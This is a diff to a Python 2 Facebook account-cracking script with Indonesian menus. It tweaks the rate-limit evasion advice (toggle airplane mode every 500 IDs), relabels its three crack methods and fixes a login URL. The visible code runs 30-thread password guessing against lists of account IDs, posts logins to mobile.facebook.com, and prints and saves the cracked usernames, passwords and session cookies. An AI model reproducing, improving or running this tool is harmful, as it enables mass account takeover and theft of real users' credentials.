@@ -216,7 +216,7 @@ class ngentod:
                         elif ind in ('1', '01'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
+                            print '%s [%s!%s] setiap crack 500 ID, gunakan mode pesawat 3 detik\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -227,7 +227,7 @@ class ngentod:
                         elif ind in ('2', '02'):
                             print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
+                            print '%s [%s!%s] setiap crack 500 ID, gunakan mode pesawat 3 detik\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -238,7 +238,7 @@ class ngentod:
                         elif ind in ('3', '03'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
+                            print '%s [%s!%s] setiap crack 500 ID, gunakan mode pesawat 3 detik\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -251,14 +251,14 @@ class ngentod:
                     print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
                     print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
                     print ' [%s02%s] methode mbasic (crack rekomendasi)'%(K,P)
-                    print ' [%s03%s] methode mobile (crack sangat lambat) '%(K,P)
+                    print ' [%s03%s] methode mobile (crack sangat rekomendasi) '%(K,P)
                     zona(pwx.split(','))
                     break
         elif unikers in ('T', 't'):
             print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
-            print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
-            print ' [%s02%s] methode mbasic (crack rekomendasi)'%(K,P)
-            print ' [%s03%s] methode mobile (crack sangat lambat) '%(K,P)
+            print ' [%s01%s] methode b-api [crack cepat]'%(K,P)
+            print ' [%s02%s] methode mbasic [crack rekomendasi]'%(K,P)
+            print ' [%s03%s] methode mobile [crack sangat rekomendasi] '%(K,P)
             self.langsung()
         else:
             print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
@@ -456,7 +456,7 @@ class ngentod:
             data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
             '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
             ses.headers.update({'referer': 'https://mobile.facebook.com/login/?next&ref=dbl&fl&refid=8'})
-            po = ses.post('https://mobile.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
+            po = ses.post('https://mobile.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmobile.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
